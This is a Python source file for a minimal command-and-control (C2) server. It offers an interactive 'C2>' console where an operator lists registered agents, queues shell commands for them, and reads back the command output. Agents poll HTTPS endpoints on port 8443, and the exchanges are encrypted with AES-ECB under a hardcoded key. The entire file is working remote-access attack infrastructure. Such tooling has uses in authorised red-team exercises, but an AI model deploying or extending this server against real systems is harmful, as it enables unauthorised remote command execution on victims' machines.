from aiohttp import web
import ssl
import cmd
from Crypto.Cipher import AES
from threading import Thread
import base64

routes = web.RouteTableDef()
global AgentNames
AgentNames = []




class AgentNameClass():
    CurrentAgentName = ""

class SentCommand():
    SendCmd = ""
    def __init__(self,input):
        self.SendCmd = input
        super(SentCommand,self).__init__()

class Ecrypto():
    def __init__(self):
        self.password = "ac59075b964b0715"
    def add_to_16(self,text):
        while len(text) % 16 != 0:
            text += '\0'
        return text
    def encrypt(self,data):
        password = self.add_to_16(self.password).encode('utf8')
        bs = AES.block_size
        pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
        cipher = AES.new(password, AES.MODE_ECB)
        data = cipher.encrypt(pad(data).encode('utf8'))
        encrypt_data = base64.b64encode(data)
        return encrypt_data

    def decrypt(self,decrData):
        password = self.add_to_16(self.password).encode('utf8')
        cipher = AES.new(password, AES.MODE_ECB)
        plain_text = cipher.decrypt(base64.b64decode(decrData))
        return plain_text.decode('utf8').rstrip('\0')

class Console(cmd.Cmd):
    prompt = "C2> "
    intro = "Type help or ? to list commands.\n"

    def __init__(self):
        super(Console,self).__init__()
    def emptyline(self):
        pass
    def do_list(self,input):
        for AgentName in AgentNames:
            print(str(AgentName))
    def help_list(self):
        print("List Agents!")
    def do_interact(self,input):
        AgentNameClass.CurrentAgentName = input
        SentCommand.SendCmd = ""
        interact_agent = AgentConsole(input)
        interact_agent.cmdloop()
    def help_interact(self):
        print("Interact with the agent: interact <agent name>")
    def do_exit(self,input):
        exit(1)

class AgentConsole(cmd.Cmd):
    prompt = "Agent> "
    intro = 'Type help or ? to list commands.\n'
    def __init__(self,input):
        self.prompt = input+"> "
        super(AgentConsole,self).__init__()
    def emptyline(self):
        pass
    def do_shell(self,input):
        SentCommand.SendCmd = "shell " + input
    def do_sleep(self,input):
        SentCommand.SendCmd = "sleep " + input
    def help_sleep(self):
        print("Execute a sleep time command: sleep <command>")
    def help_shell(self):
        print("Execute a shell command: shell <command>")
    def do_back(self,input):
        AgentNameClass.CurrentAgentName = ""
        return True
    def help_back(self):
        print("Back to the main console")

@routes.get('/')
async def handle(request):
    return web.Response(status=404)

@routes.post('/AgentName/{name}')
async def PostAgentName(request):
    AgentName = request.match_info.get('name', "Anonymous")
    AgentData = await request.text()
    print("\nAgent: " + AgentName + " Arrived!\n")
    AgentNames.append(Ecrypto().decrypt(AgentData))
    text = str(Ecrypto().encrypt("ok"),'utf-8')
    return web.Response(status=200,text=text)

@routes.get('/AgentShell/{name}')
async def GetAgentShell(request):
    getname = request.match_info.get('name', "Anonymous")
    if  getname!=AgentNameClass.CurrentAgentName:
        return web.Response(status=200)
    text = str(Ecrypto().encrypt(SentCommand.SendCmd),'utf-8')
    return web.Response(status=200,text=text)

@routes.post('/PostResults/{name}')
async def PostResultsShell(request):
    getname = request.match_info.get('name', "Anonymous")
    ShellResults = await request.text()
    if  getname!=AgentNameClass.CurrentAgentName:
        return web.Response(status=200)
    print("\n[+] Shell Command Results:")
    print("\n" + str(Ecrypto().decrypt(ShellResults)) + "\n")
    SentCommand.SendCmd = ""
    return web.Response(status=200)

app = web.Application()
app.add_routes(routes)


if __name__ == '__main__':
    print(Ecrypto().encrypt("ok"))
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain('domain_srv.crt', 'domain_srv.key')
    webApp = Thread(target=Console().cmdloop)
    webApp.start()
    web.run_app(app, ssl_context=ssl_context,port=8443)
    #web.run_app(app,port=8443)
